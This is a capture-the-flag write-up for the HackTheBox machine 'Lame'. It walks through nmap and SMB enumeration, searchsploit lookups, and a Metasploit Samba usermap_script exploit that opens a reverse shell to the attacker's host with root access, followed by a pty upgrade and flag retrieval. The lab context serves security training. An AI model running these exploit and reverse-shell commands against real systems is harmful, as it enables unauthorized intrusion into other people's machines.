# Lame-HTB

Lame is a Linux machine that rated as easy. It was the first box that got released on hackthebox. So let's start :)

# Recon

I started by runing nmap scan on the machine and found 5 open ports.

```nmap -sC -sV 10.10.10.3```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 16:41 EDT
Nmap scan report for 10.10.10.3
Host is up (0.099s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h02m41s, deviation: 2h49m43s, median: 2m40s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-08-08T16:44:10-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.57 seconds
```
## FTP
I tried Anonymous Login but didn't find anything. vsFTPd 2.3.4 is an old version so I checked searchsploit and found one exploit for it
```
root@kali:~/Desktop/HTB/Lame# searchsploit vsFTPd 2.3.4
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                           | unix/remote/17491.rb
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
## SMB
I tried using ```smbmap``` and found that I have access to one share without needing for any credentials

```
root@kali:~/Desktop/HTB/Lame# smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))        
```
So let's try access the shared folder using ```smbclient```:

```
root@kali:~/Desktop/HTB/Lame# smbclient -N //10.10.10.3/tmp
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug  8 18:54:04 2020
  ..                                 DR        0  Sun May 20 14:36:12 2012
  5143.jsvc_up                        R        0  Sat Aug  8 16:20:12 2020
  .ICE-unix                          DH        0  Sat Aug  8 16:19:08 2020
  .X11-unix                          DH        0  Sat Aug  8 16:19:34 2020
  .X0-lock                           HR       11  Sat Aug  8 16:19:34 2020

                7282168 blocks of size 1024. 5678780 blocks available
smb: \>
```
And there is nothing intrested. Let's try to search for exploit for samba 3.0

```
root@kali:~/Desktop/HTB/Lame# searchsploit samba 3.0
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                       | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                     | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                           | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                         | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                     | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                   | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                   | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                          | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                           | linux/remote/364.pl
Samba < 3.0.20 - Remote Heap Overflow                                                                      | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                      | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                              | linux_x86/dos/36741.py
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
The only one that was intresting for me was this:
```Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)```

# Exploit
I tried the FTP exploit and it didn't work :( . so moving on to SAMBA

## SAMBA
So we can now use Metasploit to exploit it.
```
msf5 > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse
msf5 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > set lhost 10.10.14.19
msf5 exploit(multi/samba/usermap_script) > exploit
```
And we got our shell as root :)

```
msf5 exploit(multi/samba/usermap_script) > exploit                                                                                                                               
[*] Started reverse TCP double handler on 10.10.14.19:443                                                                                                                         
[*] Accepted the first client connection...                                                                                                                                       
[*] Accepted the second client connection...                                                                                                                                     
[*] Command: echo zQrCq3SiPcn0h80W;                                                                                                                                               
[*] Writing to socket A                                                                                                                                                           
[*] Writing to socket B                                                                                                                                                           
[*] Reading from sockets...                                                                                                                                                       
[*] Reading from socket B                                                                                                                                                         
[*] B: "zQrCq3SiPcn0h80W\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.19:443 -> 10.10.10.3:45899) at 2020-08-08 22:16:58 -0400

id
uid=0(root) gid=0(root)
```

Let's upgrade our shell like this

```
python -c 'import pty; pty.spawn("bash")'
root@lame:/# 
```
Now we can get the flags ;)

```
cat root.txt
92caac3be140e...
```
The ```user.txt``` is in ```makis``` home directory
```
root@lame:/home/makis# cat user.txt
cat user.txt
69454a937d...
```
After I got to this point I was cuiros to know why the ftp exploit didn't work and I found that the Firewall is blocking most of it.
```
root@lame:/home/makis# netstat -tnlp
netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      5041/xinetd     
tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      5041/xinetd     
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      5041/xinetd     
tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN      5149/jsvc       
tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      5196/unrealircd 
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      4764/mysqld     
tcp        0      0 0.0.0.0:1099            0.0.0.0:*               LISTEN      5190/rmiregistry
tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      5196/unrealircd 
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      5018/smbd       
tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      5213/Xtightvnc  
tcp        0      0 0.0.0.0:49582           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      4222/portmap    
tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      5213/Xtightvnc  
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5169/apache2    
tcp        0      0 0.0.0.0:60370           0.0.0.0:*               LISTEN      4240/rpc.statd  
tcp        0      0 0.0.0.0:8787            0.0.0.0:*               LISTEN      5194/ruby       
tcp        0      0 0.0.0.0:8180            0.0.0.0:*               LISTEN      5149/jsvc       
tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      5041/xinetd     
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      5041/xinetd     
tcp        0      0 10.10.10.3:53           0.0.0.0:*               LISTEN      4617/named      
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      4617/named      
tcp        0      0 0.0.0.0:58966           0.0.0.0:*               LISTEN      5190/rmiregistry
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      5041/xinetd     
tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      4845/postgres   
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      5008/master     
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      4617/named      
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      5018/smbd       
tcp        0      0 0.0.0.0:42815           0.0.0.0:*               LISTEN      4940/rpc.mountd 
tcp6       0      0 :::2121                 :::*                    LISTEN      5087/proftpd: (acce
tcp6       0      0 :::3632                 :::*                    LISTEN      4872/distccd    
tcp6       0      0 :::53                   :::*                    LISTEN      4617/named      
tcp6       0      0 :::22                   :::*                    LISTEN      4641/sshd       
tcp6       0      0 :::5432                 :::*                    LISTEN      4845/postgres   
tcp6       0      0 ::1:953                 :::*                    LISTEN      4617/named      
```
Thanks for reading and you can find me here on Twitter: ```https://twitter.com/electronicbots```
